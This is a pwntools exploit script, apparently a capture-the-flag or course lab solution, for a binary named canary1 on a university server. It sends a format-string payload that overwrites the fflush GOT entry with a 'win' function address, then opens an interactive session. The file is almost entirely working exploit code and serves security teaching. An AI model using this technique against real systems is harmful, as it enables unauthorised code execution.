#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template canary2
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'canary1')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('lettieri.iet.unipi.it', 4411)
    else:
        return remote('localhost', 4411)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    Canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments

p_flush = exe.got['fflush']
p_win = exe.sym['win']


# to detect the fmtstr_payload's index use this
# for i in range(20):
#     io = start()
#     payload = b"A"*8+f"%{i+1}$p".encode()

#     io.sendline(payload)
#     x = io.recv()
#     print(i+1, x)
#     io.close()

ui.pause()

# this was found using the method above
i = 6

io = start()
payload = fmtstr_payload(
    i, 
    {p_flush : p_win}, 
    write_size='byte'
)

io.sendline(payload)
io.interactive()

